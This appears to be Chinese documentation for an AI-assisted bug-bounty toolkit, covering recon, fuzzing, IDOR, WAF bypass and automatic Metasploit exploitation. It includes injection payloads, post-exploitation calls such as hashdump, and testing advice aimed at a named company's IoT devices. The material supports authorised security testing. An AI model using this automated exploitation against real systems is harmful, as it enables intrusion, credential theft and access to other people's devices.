| `frameworkScoutAgent.js` | GitHub CMS 框架搜索 Agent | 搜索热门开源 CMS（Strapi/Directus/Payload CMS 等），通过 GitHub API 或内置样本列表发现审计目标 |
| `localRepoScoutAgent.js` | 本地仓库分析 Agent | 扫描 downloads 目录中的本地文件，过滤代码扩展名（.ts/.js/.py/.go 等），限制 400 文件 + 250KB/文件 |
| `srcScoutAgent.js` | SRC 一体化 Agent | 统一管理 SRC 目标、侦察、漏洞模板匹配、红线守卫，整合 targetManager + reconService + redLineGuard |

### 配置模块（src/config/）

| 文件 | 功能 | 核心能力 |
|------|------|---------|
| `auditSkills.js` | 审计技能目录 | 8 大技能类别（访问控制/Bootstrap 配置/上传存储/查询安全/密钥暴露等），每个技能含审查提示词和描述 |
| `llmProviders.js` | LLM 厂商配置 | 预设 OpenAI/Anthropic/Gemini/DeepSeek/Qwen + 兼容网关，环境变量映射，API Key 脱敏 |
| `srcVulnTemplates.js` | SRC 漏洞模板库 | 20+ 漏洞类型模板（支付负数/竞态/并发/IDOR/SSRF 等），含测试步骤、参数名、payload 示例、中文报告模板 |

### 服务层（src/services/）

| 文件 | 功能 | 核心能力 |
|------|------|---------|
| `cnvdReportWriter.js` | CNVD 报告生成器 | 中文漏洞报告（CNVD 格式），CVE+CNVD 双提交支持，漏洞类型 → CNVD 分类码映射 |
| `dependencyAudit.js` | 依赖安全审计 | 维护危险/弃用/EOL 包清单（vm2/node-serialize/lodash 等），含严重度/CVE 引用/修复建议 |
| `environmentReport.js` | 环境诊断 | 生成运行时报告：Node 版本/平台/架构/workspace 状态/活跃 LLM 配置 |
| `fingerprintService.js` | CMS/技术栈指纹识别 | 正则匹配检测 CMS（Strapi/WordPress/Drupal）和技术栈（Next.js/React/Django/Spring/GraphQL） |
| `llmReviewService.js` | LLM 代码审查服务 | 分批发送源文件给 LLM 做辅助安全审查，支持进度回调，优雅处理缺失 API Key |
| `memoryStore.js` | 持久化记忆存储 | JSON 读写 workspace，保存项目偏好/学习模式/审查规则，内置默认防御规则 |
| `reconService.js` | 侦察服务 | 子域名枚举/CDN 检测/端口扫描调度/指纹识别，常见端口→服务→攻击向量映射 |
| `redLineGuard.js` | 中国 SRC 红线守卫 | 14 条红线规则关键词检测，违规提示+补救建议 |
| `reportWriter.js` | HTML 审计报告生成 | 生成带样式的 HTML 报告（项目信息/技能标签/发现清单/LLM 审查结果/下载链接） |
| `settingsStore.js` | 持久化设置存储 | JSON 读写 workspace/settings，管理 LLM/GitHub Token/FOFA 凭证 |
| `srcReportWriter.js` | SRC 报告生成器 | 生成 Markdown + HTML 双格式中文 SRC 报告（概述/复现步骤/危害/修复建议） |
| `srcTargetManager.js` | SRC 目标管理 | 管理目标域名和授权平台（补天/漏洞盒子/火线/字节/美团/B站/阿里/腾讯） |

### 状态管理（src/store/）

| 文件 | 功能 | 核心能力 |
|------|------|---------|
| `taskStore.js` | 任务状态管理 | debounced 磁盘持久化，任务 CRUD，状态流转（pending→running→completed/failed），进度更新，监听器通知 |

---

## claude-hunt/ 核心引擎文件

| 文件 | 功能 | 说明 |
|------|------|------|
| `SKILL.md` | bug-bounty 技能定义 | Claude Code 加载的技能入口，覆盖完整狩猎流程：侦察→学习→挖掘（20种Web2+10种Web3）→验证→报告 |
| `agent.py` | LangGraph ReAct Agent | 支持真实 LangGraph + langchain-ollama 后端或内置 ReAct 循环，含工作记忆/发现日志/观察缓冲/会话持久化 |
| `brain.py` | 多 LLM 推理层 | 统一的 LLM 调用接口，支持 Ollama（本地）/Claude API/OpenAI/Grok（xAI），覆盖侦察/扫描/漏洞链/报告/JS分析/分诊/利用/自动驾驶 8 个阶段，自动检测本地模型+降级 |
| `config.example.json` | 配置模板 | Chaos API Key, H1 API Token, 输出目录, nuclei 严重度, katana 深度, ffuf 线程, interactsh 服务器 |

---

## claude-hunt/commands/ 补充命令

以下 3 个 Slash Commands 在文档前部未列出：

| 命令 | 文件 | 功能 |
|------|------|------|
| `/triage` | `triage.md` | 漏洞分诊和优先级排序 |
| `/token-scan` | `token-scan.md` | Token/凭证泄露扫描 |
| `/web3-audit` | `web3-audit.md` | 智能合约/Web3 安全审计 |

完整 commands 目录共 22 个 Slash Commands。

---

## claude-hunt/rules/ 猎手规则

| 文件 | 功能 | 说明 |
|------|------|------|
| `hunting.md` | 狩猎核心规则 | 始终生效的约束：scope 安全验证、请求速率限制、漏洞挖掘方法论、安全方法保护 |
| `reporting.md` | 报告规则 | 始终生效的约束：报告格式标准、7问门控验证、提交前检查清单 |

---

## claude-hunt/memory/ 记忆系统详解

| 文件 | 功能 | 说明 |
|------|------|------|
| `__init__.py` | 记忆系统入口 | 导出 PatternDB / AuditLog / RateLimiter / CircuitBreaker / 轮换工具 / schema 验证器 |
| `schemas.py` | JSONL Schema 验证 | 定义 journal/pattern/audit 条目的必填和可选字段，支持 schema 版本管理 |
| `pattern_db.py` | 漏洞模式数据库 | 按漏洞类型+技术栈索引的成功技术记录，线程安全 JSONL 读写（fcntl 文件锁） |
| `audit_log.py` | 请求审计日志 | 记录 autopilot 会话中每个外发请求，内置 RateLimiter（限速器）+ CircuitBreaker（断路器）安全保护 |
| `rotation.py` | 文件自动轮换 | 基于大小的 JSONL 轮换（10MB 上限，保留 3 个备份），线程安全 + fcntl 锁定 |

---

## claude-hunt/auto_agent/ 补充模块

以下模块在之前章节中未列出：

| 文件 | 功能 | 说明 |
|------|------|------|
| `checkpoint_manager.py` | 断点续跑 | 崩溃恢复机制，保存/恢复当前进度，支持中断后继续执行 |
| `false_positive_filter.py` | 误报自动过滤 | 在漏洞验证阶段自动过滤常见误报模式 |
| `scope_updater.py` | Scope 自动更新 | 管理 SRC 授权范围的自动同步和更新 |
| `shell_utils.py` | 安全 Shell 构建 | 命令防注入处理，参数安全转义 |
| `requirements.txt` | Python 依赖 | 核心依赖：openai / pyyaml / rich |
| `Dockerfile.hunter` | Agent 容器镜像 | 容器化部署 auto-hunt agent |
| `docker-compose.hunter.yml` | Agent 容器编排 | Docker Compose 一键部署 |
| `docker_start.sh` | Docker 启动脚本 | 容器化 hunter 的一键启动 |

更新后的完整 auto_agent 文件结构：

```
claude-hunt/auto_agent/
├── auto_hunt.py              # 主入口
├── agent_engine.py           # AI引擎(DeepSeek API)
├── hunt_logger.py            # 桌面日志(doing_日期.md)
├── redline_checker.py        # 红线审查
├── trace_analyzer.py         # 痕迹分析
├── waf_adapter.py            # WAF自适应
├── session_monitor.py        # Session监控
├── asset_discovery.py        # 资产关联发现
├── intel_checker.py          # 情报查重
├── checkpoint_manager.py     # 断点续跑
├── false_positive_filter.py  # 误报过滤
├── scope_updater.py          # Scope自动更新
├── hexstrike_bridge.py       # HexStrike桥接
├── shell_utils.py            # 安全Shell构建
├── config.yaml.example       # 配置模板
├── requirements.txt          # Python依赖
├── Dockerfile.hunter         # Docker镜像
├── docker-compose.hunter.yml # Docker编排
├── docker_start.sh           # Docker启动
└── phases/
    ├── base.py               # 阶段基类
    ├── recon.py              # 信息搜集
    ├── params.py             # 参数发现
    ├── hunt.py               # 漏洞检测
    ├── validate.py           # 7问验证
    ├── verify.py             # 四证齐全
    └── report.py             # 报告生成
```

---

## RedOps Agent 补充模块（redops/）

以下模块在文档前部未详细介绍：

### 未记录的顶层文件

| 文件 | 功能 | 说明 |
|------|------|------|
| `start.sh` | Kali 一键启动 | 检测 Python 环境 → 创建 venv → 安装依赖 → 选择运行模式（Web/桌面宠物/两者/仅安装） |
| `requirements.txt` | Python 依赖 | fastapi / uvicorn / pydantic / requests / Pillow / pyyaml |

### 核心模块（redops/app/core/）

| 文件 | 功能 | 说明 |
|------|------|------|
| `auto_install.py` | 渗透工具自动安装器 | 跨平台（apt/choco/brew），支持 nmap/nuclei/subfinder/httpx/naabu/ffuf/dnsx/katana/gau/waybackurls/gowitness/subjack/dalfox/crlfuzz 等 15+ 工具 |
| `manager.py` | 扫描任务管理器 | ScanTask 模型，异步执行，状态跟踪（pending→running→completed→failed），结果收集 |

### REST API 路由（redops/app/api/）

| 文件 | 路由前缀 | 核心接口 |
|------|---------|---------|
| `chat.py` | `/api/chat` | POST `/send`（消息处理+LLM交互+自动执行模式），GET `/history`（会话历史） |
| `config.py` | `/api/config` | GET/POST `/`（设置读写），POST `/llm`（LLM 厂商配置） |
| `connectors.py` | `/api/connectors` | Telegram Bot + QQ Bot 的启用/禁用/状态/配置管理 |
| `scan.py` | `/api/scan` | POST `/start`（启动扫描任务），GET `/status/{task_id}`（任务状态查询） |
| `skills.py` | `/api/skills` | GET `/`（技能列表），GET `/categories`（技能分类），POST `/execute`（执行技能） |
| `system.py` | `/api/system` | POST `/execute`（系统命令执行），GET `/status`（系统状态），POST `/install-tool`（工具安装） |
| `targets.py` | `/api/targets` | 目标 CRUD（GET/POST/PUT/DELETE），目标组管理（GET/POST/DELETE `/groups`） |

### 外部集成补充

| 文件 | 功能 | 说明 |
|------|------|------|
| `app/integrations/qq_bot.py` | QQ Bot 集成 | go-cqhttp/OneBot 协议，WebSocket 消息处理，群/用户白名单过滤 |

### 前端界面

| 文件 | 功能 | 说明 |
|------|------|------|
| `frontend/index.html` | RedOps Web 聊天界面 | 暗色主题，侧边栏导航（仪表盘/目标/扫描/配置/技能/系统），实时对话+命令执行展示 |


---

## 2025-06-20 重大更新：深度挖掘引擎 + 浏览器爬虫 + 全链路补强

### 更新背景

原工具本质上是一个"工具编排器"——调用 nuclei/dalfox/subfinder 等外部工具，AI 层只做决策和报告。真正的"挖洞能力"（HTTP 请求构造、响应差异检测、payload 变异、业务逻辑验证）几乎为零。本次更新补全了所有关键缺失。

### 新增模块总览（共 13 个文件，约 7300 行代码）

#### 第一批：深度挖掘引擎（替代纯工具编排）

| 文件 | 功能 | 解决什么问题 |
|------|------|-------------|
| `auto_agent/http_engine.py` | 异步 HTTP 请求引擎 | 原来只能 subprocess curl，无法做精细化多步请求 |
| `auto_agent/payload_generator.py` | 上下文感知 Payload 生成器 | 原来没有自定义 payload，只靠外部工具模板 |
| `auto_agent/active_fuzzer.py` | 基于响应差异的主动 Fuzz | 原来参数发现全靠被动（gau/waybackurls） |
| `auto_agent/idor_tester.py` | 系统性 IDOR 越权测试 | 原来只做简单 cookie 互换，没有 ID 枚举/方法变换 |
| `auto_agent/business_logic_tester.py` | 业务逻辑漏洞测试 | 原来完全没有（金额篡改/竞态/流程跳跃/权限提升） |
| `auto_agent/real_validator.py` | 真正发请求验证漏洞 | 原来是问 LLM "你觉得这是真洞吗"——AI 自问自答 |
| `auto_agent/waf_bypass.py` | WAF 绕过（编码/变异/HPP） | 原来只检测 WAF 然后降速，不做任何绕过 |
| `auto_agent/phases/deep_hunt.py` | 深度挖掘集成阶段 | 串联以上所有新模块，插入到 pipeline 中 |

#### 第二批：攻击面发现 + 持续监控 + 认证管理

| 文件 | 功能 | 解决什么问题 |
|------|------|-------------|
| `auto_agent/browser_crawler.py` | Playwright 浏览器爬虫 | 现代 SPA 应用用 curl 只看到空 HTML，看不到 API |
| `auto_agent/js_analyzer.py` | JS 文件安全分析 | 漏掉 JS bundle 中的硬编码 key/隐藏 API/XSS sink |
| `auto_agent/auth_manager.py` | Token/Session 自动刷新 | Session 过期整个流程就中断了 |
| `auto_agent/change_monitor.py` | 变化检测 + Webhook 通知 | 新功能上线时不知道，错过最佳挖洞窗口 |
| `auto_agent/db_store.py` | SQLite 持久化存储 | 每次跑完数据丢失，无法增量扫描和历史对比 |
| `auto_agent/api_discovery.py` | API Schema 自动发现 | Swagger/GraphQL/隐藏端点没被发现 |

### 核心能力提升对比

| 能力 | 改之前 | 改之后 |
|------|--------|--------|
| HTTP 请求 | subprocess curl（无状态） | 异步 httpx 引擎（支持 session/cookie/并发/重试） |
| 注入点发现 | 靠 dalfox/nuclei 模板 | **响应差异检测**（状态码/长度/时间/反射上下文分析） |
| IDOR 测试 | 一次 cookie 互换 | ID 枚举 + 方法变换(GET/PUT/DELETE) + API 版本降级 + GraphQL node() + 参数污染 |
| 漏洞验证 | 问 LLM 7 个问题 | **发真实 HTTP 请求验证**（布尔盲注/时间延迟/反射检查） |
| 业务逻辑 | 5 个并发 curl | 金额篡改 + 竞态(带状态前后对比) + 流程跳跃 + 权限提升 |
| WAF 处理 | 检测后降速 | 编码变异/注释插入/大小写混淆/HPP/Unicode/分块传输 |
| 攻击面发现 | subfinder + gau（被动） | **Playwright 爬 SPA** + JS 分析 + API schema 探测 |
| 认证管理 | 静态 cookie，过期就停 | 自动检测过期 + 重新登录/JWT刷新/OAuth2 refresh |
| 数据持久化 | 内存/日志文件 | SQLite 数据库（跨次运行/历史对比/增量扫描） |
| 监控通知 | 无 | 子域名/页面/JS 变化检测 + 飞书/钉钉/Telegram 通知 |

### 安装新依赖

```bash
cd claude-hunt/auto_agent
pip install -r requirements.txt
playwright install chromium
```

新增的 Python 依赖：
- `httpx>=0.25.0` — 异步 HTTP 引擎
- `playwright>=1.40.0` — 浏览器爬虫（安装后还需 `playwright install chromium`）

### 使用方式

#### 正常运行（新模块自动集成到 pipeline）

```bash
python auto_hunt.py --target example.com --mode semi
# DeepHuntPhase 会在 HuntPhase 之后自动运行
```

#### 单独使用浏览器爬虫

```python
import asyncio
from browser_crawler import BrowserCrawler

crawler = BrowserCrawler({
    "target": "https://target.com",
    "cookies": [{"name": "session", "value": "xxx", "domain": "target.com"}],
    "max_pages": 30,
    "headless": True,
})
result = asyncio.run(crawler.crawl())
print(f"发现 {len(result.api_endpoints)} 个 API 端点")
print(f"发现 {len(result.js_files)} 个 JS 文件")
```

#### 单独使用 JS 分析

```python
from js_analyzer import JSAnalyzer

analyzer = JSAnalyzer()
with open("app.bundle.js") as f:
    result = analyzer.analyze(f.read(), source_url="https://target.com/app.js")

print(f"端点: {len(result.endpoints)}")
print(f"密钥: {len(result.secrets)}")
print(f"XSS Sink: {len(result.sinks)}")

# 查看高危发现
for finding in result.all_findings:
    if finding.severity in ("critical", "high"):
        print(f"  [{finding.severity}] {finding.category}: {finding.value}")
```

#### 单独使用变化监控

```python
import asyncio
from change_monitor import ChangeMonitor

monitor = ChangeMonitor({
    "targets": ["target.com", "api.target.com"],
    "webhook_url": "https://open.feishu.cn/open-apis/bot/v2/hook/你的token",
    "webhook_type": "feishu",
    "check_interval": 1800,  # 每30分钟
})

# 单次检查
changes = asyncio.run(monitor.check_all())

# 持续运行
asyncio.run(monitor.run_forever())
```

#### 单独使用响应差异检测（挖注入点的核心）

```python
import asyncio
from http_engine import HttpEngine

async def find_injection():
    engine = HttpEngine({"rate_limit": 3, "cookies": {"session": "xxx"}})
    
    # 对每个参数发送 payload，检测响应差异
    results = await engine.diff_responses(
        url="https://target.com/api/search",
        param="q",
        payloads=["'", "\"", "{{7*7}}", "<script>", "' OR '1'='1"],
    )
    
    for r in results:
        if r.anomaly_score >= 30:
            print(f"异常! payload='{r.payload}' score={r.anomaly_score}")
            if r.reflected:
                print(f"  反射上下文: {r.reflection_context}")
            if r.time_diff > 2:
                print(f"  时间延迟: {r.time_diff:.2f}s (可能是盲注)")
    
    await engine.close()

asyncio.run(find_injection())
```

### 新增配置项（config.yaml）

```yaml
# 深度挖掘
deep_hunt:
  enabled: true
  proxy: "http://127.0.0.1:8080"  # 接 Burp 看流量
  enable_fuzz: true
  enable_idor: true
  enable_bizlogic: true
  enable_auth_bypass: true
  anomaly_threshold: 30           # 响应差异检测阈值

# 浏览器爬虫
browser_crawler:
  enabled: true
  headless: true
  max_pages: 50
  login_url: "https://target.com/login"
  login_username: "test@test.com"
  login_password: "password123"

# 认证管理
auth_manager:
  type: "jwt"                     # cookie/jwt/oauth2/apikey
  jwt_refresh_url: "https://target.com/api/auth/refresh"
  check_url: "https://target.com/api/me"

# 变化监控
change_monitor:
  targets: ["target.com"]
  webhook_url: "https://open.feishu.cn/open-apis/bot/v2/hook/xxx"
  webhook_type: "feishu"          # feishu/dingtalk/telegram/discord
  check_interval: 3600

# 持久化
db_store:
  enabled: true
  db_path: "~/.bai-agent/hunt.db"

# API 发现
api_discovery:
  probe_swagger: true
  probe_graphql: true
  probe_common_paths: true
```

### 架构变化

原流程：
```
Recon → Params → Hunt(nuclei/dalfox) → Validate(问AI) → Verify(问AI) → Report
```

新流程：
```
Recon → Params → Hunt(nuclei/dalfox) → DeepHunt(HTTP引擎+差异检测+IDOR+业务逻辑+WAF绕过+真实验证) → Validate → Verify → Report
```

`DeepHuntPhase` 在原有的 `HuntPhase`（工具编排）之后运行，用自研引擎做精细化测试：
1. 对每个带参数的 URL 做响应差异 Fuzz
2. 系统性 IDOR 越权（多维度）
3. 业务逻辑测试（竞态/金额/流程）
4. 认证绕过（403 header/路径变异）
5. 所有发现用真实 HTTP 请求验证（不再问 AI）

### 为什么这些改动能帮你挖到洞

1. **响应差异检测** — 这是手工挖洞高手的核心技术。看到长度变了/状态码变了/延迟增加了，就知道有注入点。
2. **浏览器爬虫** — 90%的SRC目标是SPA，curl只看到空HTML。有了Playwright才能看到真正的API。
3. **JS 分析** — 大量高价值洞藏在 JS 里：硬编码API Key、未公开管理接口、调试端点。
4. **变化监控** — 新功能=未审计代码=最容易出洞。第一时间知道目标更新了什么。
5. **真实验证** — 不再产出"AI觉得是洞"的误报，而是"我发了请求确认了"的真洞。



---

## 2025-06-20 APP/IoT 目标适配模块

### 为什么需要

模拟对补天 SRC 目标 **DREAME HOME（com.dreame.smartlife.com）设备交互接口** 的挖掘流程时，发现工具的致命缺陷：

- `subfinder -d com.dreame.smartlife.com` → 返回空（这是包名不是域名）
- `gau / waybackurls` → 返回空（Web Archive 没有 APP 后端记录）
- 整个 Recon 阶段产出为零，后续所有阶段都跑不动

**结论：原工具只认域名，完全不认 APP 包名和 IoT 设备目标。**

### 新增文件

| 文件 | 功能 |
|------|------|
| `app_recon.py` | APP/IoT 专用信息搜集（自动识别目标类型→APK分析→包名推导域名→IoT协议探测→云平台识别） |
| `iot_hunter.py` | IoT 设备专项漏洞测试（设备IDOR/固件未授权/ID枚举/API认证缺失/信息泄露） |

### 目标类型自动识别

输入 `com.dreame.smartlife` 时工具会自动检测：

```
com.dreame.smartlife → 识别为 APP 包名
  → 自动切换到 APP Recon 路径（不走 subfinder/gau）
  → 从包名推导域名: api.dreame.com, iot.dreame.com, mqtt.dreame.com...
  → 探测 IoT 协议端口 (MQTT 1883/8883, CoAP 5683)
  → 识别云平台 (涂鸦/阿里云IoT/AWS IoT)
```

### APP Recon 流程

```
输入 APP 包名
  │
  ├── 有 APK 文件？
  │     ├── 有 jadx → 反编译提取所有 URL/API/密钥
  │     ├── 有 apktool → 解码 smali 提取字符串
  │     └── 都没有 → strings + unzip 降级提取
  │
  ├── 有 HAR 抓包文件？→ 解析所有 API 请求
  │
  ├── 什么都没有？→ 包名推导域名（16个候选）
  │
  ├── IoT 端口探测 → MQTT/CoAP/自定义端口
  │
  └── 云服务识别 → AWS IoT/阿里云/涂鸦/小米
```

### IoT 设备专项测试

| 测试项 | 说明 | 严重程度 |
|--------|------|---------|
| 设备 IDOR | 用 A 的 token 访问 B 的设备 | 高危/严重 |
| 固件未授权 | OTA 接口无需认证即可下载固件 | 高危 |
| 设备 ID 枚举 | MAC/数字/十六进制 ID 可预测遍历 | 高危 |
| API 未认证 | 设备接口不需要 token 即可访问 | 严重 |
| 信息泄露 | 返回 WiFi 密码/GPS/Token 等敏感字段 | 中高危 |

### 使用方式

```yaml
# config.yaml
app:
  apk_path: "/path/to/dreame_home.apk"   # 下载APK
  har_path: "/path/to/capture.har"        # mitmproxy抓包

iot:
  token_a: "Bearer eyJ..."
  token_b: "Bearer eyJ..."
  device_id_a: "你的设备DID"
  device_id_b: "另一个设备DID"
  base_url: "https://api.dreame.com"
```

```bash
# 运行（自动识别为APP目标）
python auto_hunt.py --target com.dreame.smartlife --mode semi
```

### 对追觅智能家居的测试建议

1. **先抓包** — 手机装 mitmproxy 证书，正常使用 APP 操作扫地机，导出 HAR
2. **找到真实 API 域名** — 从抓包中确认 base_url
3. **注册两个账号** — 获取双 token + 双设备 ID
4. **重点测试方向**：
   - 设备控制接口是否校验设备归属（IDOR）
   - 设备地图/清扫记录是否可被他人查看
   - 固件更新接口是否需要认证
   - 设备分享功能的权限边界

### 语法验证通过

```
=== 目标类型识别测试 ===
  PASS com.dreame.smartlife -> app
  PASS com.dreame.smartlife.com -> app
  PASS api.dreame.com -> domain
  PASS 192.168.1.1 -> ip

=== AppRecon 初始化测试 ===
  PASS Inferred 16 candidate domains:
    - api.dreame.com
    - app-api.dreame.com
    - iot.dreame.com
    - iot-api.dreame.com
    - mqtt.dreame.com

=== ALL SYNTAX CHECKS PASSED ===
```



---

## 2025.05 新增：第三轮能力补全（3 个差异化模块）

在前两轮整合（Shannon + 5大框架）的基础上，针对 GitHub 上所有同类工具的对比分析，补全了 3 个当前仍缺失的差异化能力。原有代码零修改。

### 新增模块

| 模块 | 文件 | 能力 |
|------|------|------|
| **Metasploit 集成** | `claude-hunt/auto_agent/metasploit_bridge.py` | 通过 RPC/CLI 双模式自动调用 Metasploit exploit + 后渗透 |
| **CVE 情报关联** | `claude-hunt/auto_agent/cve_intelligence.py` | 扫描结果自动匹配 NVD/ExploitDB，补充 CVSS + 已知 exploit |
| **SRC 平台报告** | `claude-hunt/auto_agent/src_submitter.py` | 补天/漏洞盒子/HackerOne 三平台标准格式报告一键生成 |

---

### Metasploit Bridge (`metasploit_bridge.py`)

**解决的问题：** 发现漏洞后需要手动打开 msfconsole 配置 exploit，现在可以自动化。

**双模式运行：**
- **RPC 模式**：通过 msfrpcd 完全控制（推荐）
- **CLI 模式**：降级方案，通过 `msfconsole -x` 执行（无需 RPC 服务）

```python
from metasploit_bridge import MetasploitBridge

msf = MetasploitBridge(password="yourpassword")
await msf.connect()

# 搜索 exploit（本地知识库 + RPC 搜索）
modules = await msf.search_exploit("log4j", cve="CVE-2021-44228")

# 一键自动利用
result = await msf.auto_exploit(
    target="192.168.1.100",
    port=8080,
    cve="CVE-2021-44228",
    platform="linux",
)

if result.success:
    # 后渗透
    post_results = await msf.post_exploit(
        result.session,
        actions=["sysinfo", "hashdump", "suggest_exploits"]
    )

# 从 findings 批量利用
results = await msf.exploit_from_findings(findings["vulnerabilities"])
```

**内置知识库（20+ 常见漏洞 → 模块映射）：**
- Log4Shell / Spring4Shell / Struts S2-045
- EternalBlue / WebLogic / Jenkins / Confluence
- ThinkPHP / Shiro / Redis / Tomcat GhostCat
- ...

**前置条件：**
```bash
# 启动 Metasploit RPC（Kali 上）
msfrpcd -P yourpassword -S -a 127.0.0.1

# 或者不启动 RPC，自动降级为 CLI 模式（需要 msfconsole 在 PATH 中）
```

---

### CVE Intelligence (`cve_intelligence.py`)

**解决的问题：** 发现目标跑的是 Apache 2.4.49，但不知道有什么已知 CVE 可以直接用。

**三层查询（快→慢）：**
1. 本地高频知识库（20+ 国内SRC常见CVE，秒级响应）
2. 文件缓存（7天有效）
3. NVD API 在线查询

```python
from cve_intelligence import CVEIntelligence, enrich_with_cve

intel = CVEIntelligence()

# 查询单个 CVE
info = await intel.lookup_cve("CVE-2021-44228")
print(f"{info.cve_id}: CVSS {info.cvss_score}, Exploit: {info.exploit_available}")
print(f"Nuclei: {info.nuclei_template}, MSF: {info.metasploit_module}")

# 根据技术栈批量匹配
cves = await intel.match_tech_stack(["apache 2.4.49", "spring-boot 2.5.0", "fastjson 1.2.68"])
for cve in cves:
    print(f"  {cve.cve_id} ({cve.severity}): {cve.description}")

# 自动为 findings 补充情报（最实用！）
enriched_findings = await enrich_with_cve(findings["vulnerabilities"])
# 每个 finding 自动补充: cve, cvss_score, exploit_links, nuclei_template, metasploit_module

# 搜索 exploit
exploits = await intel.search_exploits("apache struts rce")
```

**本地知识库覆盖（离线可用）：**

| CVE | 漏洞 | CVSS |
|-----|------|------|
| CVE-2021-44228 | Log4Shell | 10.0 |
| CVE-2022-22965 | Spring4Shell | 9.8 |
| CVE-2017-5638 | Struts S2-045 | 10.0 |
| CVE-2021-41773 | Apache 路径遍历 | 9.8 |
| CVE-2022-26134 | Confluence OGNL 注入 | 9.8 |
| CVE-2020-14882 | WebLogic 未授权 RCE | 9.8 |
| CVE-2018-20062 | ThinkPHP RCE | 9.8 |
| CVE-2016-4437 | Shiro 默认密钥 | 8.1 |
| CVE-2022-25845 | Fastjson 反序列化 | 9.8 |
| CVE-2021-29441 | Nacos 未授权 | 8.8 |
| ... | 共 20+ 高频 CVE | |

**技术栈 → CVE 自动映射（覆盖 20+ 技术）：**
apache / nginx / tomcat / spring / struts / log4j / shiro / fastjson / thinkphp / weblogic / confluence / gitlab / jenkins / redis / elasticsearch / nacos / wordpress / drupal / exchange / docker / kubernetes

---

### SRC Submitter (`src_submitter.py`)

**解决的问题：** 挖到洞后还要花 30 分钟写报告格式化，现在一键生成可直接提交的标准格式。

**支持三大平台：**
- 补天 SRC（默认）
- 漏洞盒子
- HackerOne（英文）
- 企业 SRC 通用格式

```python
from src_submitter import SRCSubmitter, generate_src_report, batch_src_reports

# 单个漏洞 → 报告（直接复制粘贴到平台）
report_text = generate_src_report(finding, platform="butian", company="某某科技")
print(report_text)

# 批量生成并保存
paths = batch_src_reports(
    findings=verified_findings,
    platform="vulbox",
    output_dir="./src_reports",
    company="目标公司名"
)
# 生成: ./src_reports/01_SQL注入_xxx_vulbox.md, 02_越权_xxx_vulbox.md, ...
```

**自动生成的内容包括：**
- 漏洞标题（自动格式化）
- 漏洞分类（自动映射到平台分类）
- 严重等级
- 漏洞描述（根据类型自动生成）
- 复现步骤（从 finding 的 payload/steps 自动组装）
- HTTP 请求包（格式化展示）
- 影响说明（按类型生成业务影响描述）
- 修复建议（内置 11 类漏洞的修复方案）

**内置修复建议覆盖：**
SQL注入 / XSS / SSRF / IDOR越权 / RCE / 文件上传 / 信息泄露 / 竞态条件 / 业务逻辑 / 认证缺陷 / 未授权访问

**提交前查重：**
```python
submitter = SRCSubmitter(platform="butian")
is_dup = submitter.check_duplicate(new_finding, history=previous_submissions)
if not is_dup:
    report = submitter.generate_report(new_finding)
```

---

### 完整工作流示例

```python
# 1. 扫描发现漏洞
findings = auto_hunt_result["vulnerabilities"]

# 2. CVE 情报补充
from cve_intelligence import enrich_with_cve
findings = await enrich_with_cve(findings)

# 3. 有 CVE 的尝试 Metasploit 自动利用
from metasploit_bridge import MetasploitBridge
msf = MetasploitBridge(password="msf")
await msf.connect()
exploit_results = await msf.exploit_from_findings(findings)

# 4. 生成 SRC 报告
from src_submitter import batch_src_reports
report_paths = batch_src_reports(findings, platform="butian", company="目标公司")

# 完成：扫描 → 情报 → 利用 → 报告，全自动
```
